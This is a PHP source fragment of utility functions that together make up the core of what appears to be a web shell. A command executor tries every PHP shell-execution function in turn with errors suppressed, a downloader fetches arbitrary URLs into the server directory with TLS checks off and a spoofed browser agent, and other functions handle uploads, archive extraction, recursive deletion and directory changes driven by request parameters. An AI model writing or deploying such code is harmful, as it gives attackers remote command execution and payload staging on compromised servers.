// ========== UTILITY ==========
function getCurrentDir(): string {
    static $dir = null;
    if ($dir === null) {
        $default = function_exists('getcwd') ? getcwd() : dirname(__FILE__);
        $candidate = $_GET['d'] ?? $_SESSION['cwd'] ?? $default;
        $real = @realpath($candidate);
        if ($real === false || !is_dir($real)) $real = @realpath($default);
        if ($real === false) $real = dirname(__FILE__);
        $dir = rtrim(str_replace('\\', '/', $real), '/') . '/';
        $_SESSION['cwd'] = $dir;
    }
    return $dir;
}

function formatBytes($bytes, int $precision = 2): string {
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    $bytes = max((float)$bytes, 0);
    $pow = $bytes > 0 ? (int)floor(log($bytes) / log(1024)) : 0;
    $pow = min($pow, count($units) - 1);
    return round($bytes / pow(1024, $pow), $precision) . ' ' . $units[$pow];
}

function sanitizeFilename(string $name): string {
    $name = basename($name);
    $name = preg_replace('/[\x00-\x1F\x7F\/\\\\]/', '', $name);
    $name = trim($name, '._- ');
    if ($name === '') $name = 'file_' . time();
    return $name;
}

function safePath(string $baseDir, string $name): ?string {
    $name = sanitizeFilename($name);
    $target = rtrim($baseDir, '/') . '/' . $name;
    $real = @realpath($target);
    if ($real !== false) {
        $baseReal = rtrim(@realpath($baseDir) ?: $baseDir, '/');
        if (strpos($real, $baseReal) !== 0) return null;
        return $real;
    }
    return $target;
}

function executeCommand(string $cmd, ?string $cwd = null): string {
    $cwd = $cwd ?: getCurrentDir();
    $cmd = trim($cmd);
    if ($cmd === '') return '';

    if (preg_match('/^\s*cd\s+(.+)$/i', $cmd, $m)) {
        $newDir = trim($m[1], " \t\"'");
        if ($newDir === '~') $newDir = $_SERVER['HOME'] ?? '/tmp';
        if ($newDir[0] !== '/' && $newDir !== '..' && strpos($newDir, './') !== 0) {
            $newDir = $cwd . $newDir;
        }
        $real = @realpath($newDir);
        if ($real && is_dir($real)) {
            $_SESSION['cwd'] = rtrim(str_replace('\\', '/', $real), '/') . '/';
            return "Directory changed to: {$real}";
        }
        return "Directory not found: {$newDir}";
    }

    if (preg_match('/^(wget|curl)/i', $cmd)) return handleDownloadCommand($cmd, $cwd);

    $fullCmd = 'cd ' . escapeshellarg($cwd) . ' 2>/dev/null; ' . $cmd . ' 2>&1';
    $output = '';
    if (function_exists('shell_exec')) $output = @shell_exec($fullCmd);
    if (empty($output) && function_exists('exec')) { @exec($fullCmd, $o, $c); $output = implode("\n", $o); }
    if (empty($output) && function_exists('system')) { ob_start(); @system($fullCmd, $c); $output = ob_get_clean(); }
    if (empty($output) && function_exists('passthru')) { ob_start(); @passthru($fullCmd, $c); $output = ob_get_clean(); }
    if (empty($output) && function_exists('proc_open')) {
        $d = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $p = @proc_open($fullCmd, $d, $pipes, $cwd);
        if (is_resource($p)) {
            $output = stream_get_contents($pipes[1]);
            $err = stream_get_contents($pipes[2]);
            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
            proc_close($p);
            if ($err && empty($output)) $output = $err;
        }
    }
    return trim($output) !== '' ? $output : '(no output)';
}

function handleDownloadCommand(string $cmd, string $cwd): string {
    preg_match('/https?:\/\/[^\s]+/i', $cmd, $m);
    $url = $m[0] ?? '';
    if (!$url) return "Error: No URL found";

    $filename = null;
    if (preg_match('/--output-document[= ]([^\s]+)/i', $cmd, $mm)) $filename = sanitizeFilename($mm[1]);
    elseif (preg_match('/-O\s+([^\s]+)/', $cmd, $mm)) $filename = sanitizeFilename($mm[1]);
    else {
        $base = basename(parse_url($url, PHP_URL_PATH) ?? '');
        $filename = $base ? sanitizeFilename($base) : 'downloaded_' . time() . '.bin';
    }

    $target = rtrim($cwd, '/') . '/' . $filename;
    $content = false;

    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
            'http' => ['timeout' => 60, 'user_agent' => 'Mozilla/5.0'],
        ]);
        $content = @file_get_contents($url, false, $ctx);
    }
    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 60,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    if ($content !== false && @file_put_contents($target, $content)) {
        @chmod($target, 0644);
        return "Downloaded: {$filename} (" . formatBytes(strlen($content)) . ")";
    }
    return "Download failed: {$url}";
}

function handleUpload(array $files, string $targetDir): array {
    if (isset($files['name']) && !is_array($files['name'])) {
        $files = ['name' => [$files['name']], 'tmp_name' => [$files['tmp_name']], 'error' => [$files['error']], 'size' => [$files['size']]];
    }
    $uploaded = [];
    if (!isset($files['name'])) return $uploaded;

    foreach ($files['name'] as $i => $name) {
        if (($files['error'][$i] ?? 1) !== UPLOAD_ERR_OK) continue;
        if (!is_uploaded_file($files['tmp_name'][$i])) continue;
        $clean = sanitizeFilename($name);
        $target = rtrim($targetDir, '/') . '/' . $clean;
        if (@move_uploaded_file($files['tmp_name'][$i], $target)) {
            @chmod($target, 0644);
            $uploaded[] = $clean;
        }
    }
    return $uploaded;
}

function extractArchive(string $zipPath, string $extractTo, bool $deleteAfter = true): array {
    $results = [];
    if (!file_exists($zipPath)) return ["Archive not found: " . basename($zipPath)];
    if (!is_dir($extractTo)) @mkdir($extractTo, 0755, true);

    $baseReal = rtrim(@realpath($extractTo) ?: $extractTo, '/');
    $extracted = false;

    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zipPath) === true) {
            $count = 0;
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $entry = $zip->getNameIndex($i);
                $targetPath = $baseReal . '/' . $entry;
                $real = @realpath(dirname($targetPath));
                if ($real === false) {
                    $real = dirname($targetPath);
                }
                $normalized = str_replace('\\', '/', $real);
                if (strpos($normalized, $baseReal) !== 0 && strpos($normalized . '/', $baseReal) !== 0) {
                    continue;
                }
                $zip->extractTo($extractTo, $entry);
                $count++;
            }
            $zip->close();
            $results[] = "Extracted: {$count} files";
            $extracted = true;
        }
    }
    if (!$extracted && function_exists('shell_exec')) {
        $cmd = 'cd ' . escapeshellarg($extractTo) . ' && unzip -o ' . escapeshellarg($zipPath) . ' 2>&1';
        $o = @shell_exec($cmd);
        if ($o && (stripos($o, 'inflating') !== false || stripos($o, 'extracting') !== false)) {
            $results[] = "Extracted via CLI";
            $extracted = true;
        }
    }
    if ($extracted && $deleteAfter) { @unlink($zipPath); $results[] = "Original archive deleted"; }
    elseif (!$extracted) $results[] = "Failed to extract";
    return $results;
}

function deleteRecursive(string $path): bool {
    if (is_link($path) || is_file($path)) return @unlink($path);
    if (is_dir($path)) {
        $items = @scandir($path);
        if ($items) {
            foreach ($items as $it) {
                if ($it === '.' || $it === '..') continue;
                deleteRecursive($path . '/' . $it);
            }
        }
        return @rmdir($path);
    }
    return false;
}

